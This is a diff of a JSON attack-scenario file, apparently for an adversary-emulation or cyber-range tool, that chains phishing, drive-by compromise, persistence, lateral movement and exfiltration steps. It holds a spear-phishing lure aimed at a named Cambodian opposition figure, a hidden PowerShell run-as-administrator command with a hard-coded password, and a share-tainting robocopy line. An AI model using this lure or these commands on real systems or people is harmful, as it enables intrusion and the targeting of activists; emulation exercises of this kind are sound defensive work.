@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -61,14 +64,14 @@
             "technique": "SpearPhishingLink",
             "label": "spearPhishingLink",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
-                "body": "Dear Kem Monovithya,\nI'm Chheng Sophors from LICADOH. I went to monitor the appeal court trial of Kem Sokha case on bail and I am sorry that Kem Sokha has lost his final bid for bail. Before we have contacted ASEAN Parliamentarians for Human Rights to call for Sokha's release but the political situation is getting worse. Recently we've contacted some human rights groups and ask if we can publish an article jointly on Washington Post about the polical rights environment in Cambodia. Would you mind voicing your opinions about the political instability in Cambodia? Please use the following link:  http://${self.driveby_domain}/${self.payload_name}- Freedom of Expression \n    - Women's Rights \n    - CNRP Cambodia Status \n    - CNRP Donation Status \n    - Political Party Registration \nWith profound respect\nChheng Sophors"
+                "body": "Dear Kem Monovithya,\nI'm Chheng Sophors from LICADOH. I went to monitor the appeal court trial of Kem Sokha case on bail and I am sorry that Kem Sokha has lost his final bid for bail. Before we have contacted ASEAN Parliamentarians for Human Rights to call for Sokha's release but the political situation is getting worse. Recently we've contacted some human rights groups and ask if we can publish an article jointly on Washington Post about the polical rights environment in Cambodia. Would you mind voicing your opinions about the political instability in Cambodia? Please use the following link:  http://${state.driveby_domain}/${state.payload_name}- Freedom of Expression \n    - Women's Rights \n    - CNRP Cambodia Status \n    - CNRP Donation Status \n    - Political Party Registration \nWith profound respect\nChheng Sophors"
             }
         },
         {
@@ -76,11 +79,11 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -88,11 +91,11 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -100,11 +103,14 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "phishing": "self.phish_1",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "phishing": "state.phish_1",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -112,11 +118,11 @@
             "technique": "ValidAccounts_LocalAccounts",
             "label": "validAccounts_LocalAccounts_t1",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target_1": "self.target_1",
-                "target_2": "self.target_1_elevated"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target_1": "state.target_1",
+                "target_2": "state.target_1_elevated"
             }
         },
         {
@@ -124,10 +130,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1_elevated"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1_elevated"
+            },
+            "set_state": {
+                "agent_tgt1_elevated": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -135,9 +144,9 @@
             "technique": "RemoteSystemDiscovery",
             "label": "remoteSystemDiscovery_t1_elevated_1",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             },
             "tune": {
                 "command": "net view"
@@ -148,9 +157,9 @@
             "technique": "CreateAccount_LocalAccount",
             "label": "createAccount_LocalAccount_t1_elevated",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -158,10 +167,10 @@
             "technique": "ScheduledTaskPersistence",
             "label": "scheduled_task_persistence_t1_elevated",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -169,10 +178,10 @@
             "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -180,10 +189,10 @@
             "technique": "RemoteFileCopy_RoboCopy",
             "label": "remoteServices_filecopy",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -191,10 +200,10 @@
             "technique": "ScheduledTask",
             "label": "scheduled_task",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -202,11 +211,11 @@
             "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target_1": "self.target_1_elevated",
-                "target_2": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target_1": "state.target_1_elevated",
+                "target_2": "state.target_2"
             }
         },
         {
@@ -214,10 +223,13 @@
             "technique": "WebProtocols",
             "label": "webProtocols_3",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_2"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_2"
+            },
+            "set_state": {
+                "agent_tgt2": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -225,13 +237,13 @@
             "technique": "TaintSharedContent",
             "label": "taintSharedContent_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "robocopy c:\\windows\\SysWow64\\ \\\\file\\share${self.payload_name}"
+                "command": "robocopy c:\\windows\\SysWow64\\ \\\\file\\share${state.payload_name}"
             }
         },
         {
@@ -239,14 +251,14 @@
             "technique": "ValidAccounts_LocalAccounts",
             "label": "validAccounts_LocalAccounts_t2",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target_1": "self.target_2",
-                "target_2": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target_1": "state.target_2",
+                "target_2": "state.target_2"
             },
             "tune": {
-                "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator', $password); start-process powershell -credential $credential -argumentlist \"-noprofile -command &{\\file\\share${self.payload_name}} -windowstyle Hidden"
+                "command": "powershell &{$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential ('administrator', $password); start-process powershell -credential $credential -argumentlist \"-noprofile -command &{\\file\\share${state.payload_name}} -windowstyle Hidden"
             }
         },
         {
@@ -254,10 +266,10 @@
             "technique": "ScheduledTaskPersistence",
             "label": "scheduled_task_persistence_t2",
             "preconditions": {
-                "actuator": "self.actuator",
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "actuator": "state.actuator",
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -265,10 +277,10 @@
             "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2",
-                "exfil": "self.exfil"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2",
+                "exfil": "state.exfil"
             }
         },
         {
@@ -276,9 +288,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt2",
-                "tool": "self.tool",
-                "target": "self.target_2"
+                "agent": "state.agent_tgt2",
+                "tool": "state.tool",
+                "target": "state.target_2"
             }
         },
         {
@@ -286,9 +298,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1_elevated",
-                "tool": "self.tool",
-                "target": "self.target_1_elevated"
+                "agent": "state.agent_tgt1_elevated",
+                "tool": "state.tool",
+                "target": "state.target_1_elevated"
             }
         },
         {
@@ -296,9 +308,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -332,9 +344,9 @@
             "mt.exe"
         ],
         "taskname": [
-            "windowsUpdater58",
-            "windowsUpdater53",
-            "windowsUpdater42"
+            "windowsUpdater67",
+            "windowsUpdater67",
+            "windowsUpdater69"
         ]
     },
     "spec": {
@@ -387,156 +399,26 @@
             "2": {
                 "payload_destination": "C:\\Windows\\SysWow64",
                 "persist_location": "C:\\Windows\\SysWow64\\atasagent.exe",
-                "ioc-taskname": "leviathan_legacy_37"
+                "ioc-taskname": "leviathan_legacy_28"
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "phish_1": {
-                "path": [
-                    "phishing",
-                    "1"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_1_elevated": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "target_2": {
-                "path": [
-                    "targets",
-                    "2"
-                ]
-            },
-            "target_2_username": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_username"
-                ]
-            },
-            "target_2_password": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-domain_admin_password"
-                ]
-            },
-            "target_2_hostname": {
-                "path": [
-                    "targets",
-                    "2",
-                    "query-target_hostname"
-                ]
-            },
-            "target_2_taskname": {
-                "path": [
-                    "targets",
-                    "2",
-                    "ioc-taskname"
-                ]
-            },
-            "target_2_persist_location": {
-                "path": [
-                    "targets",
-                    "2",
-                    "persist_location"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt1_elevated": {
-                "path": [
-                    "webProtocols_2",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            },
-            "agent_tgt2": {
-                "path": [
-                    "webProtocols_3",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "phish_1": "spec.phishing.1",
+        "target_1": "spec.targets.1",
+        "target_1_elevated": "spec.targets.1",
+        "target_2": "spec.targets.2",
+        "target_2_username": "spec.targets.2.query-domain_admin_username",
+        "target_2_password": "spec.targets.2.query-domain_admin_password",
+        "target_2_hostname": "spec.targets.2.query-target_hostname",
+        "target_2_taskname": "spec.targets.2.ioc-taskname",
+        "target_2_persist_location": "spec.targets.2.persist_location"
     }
 }
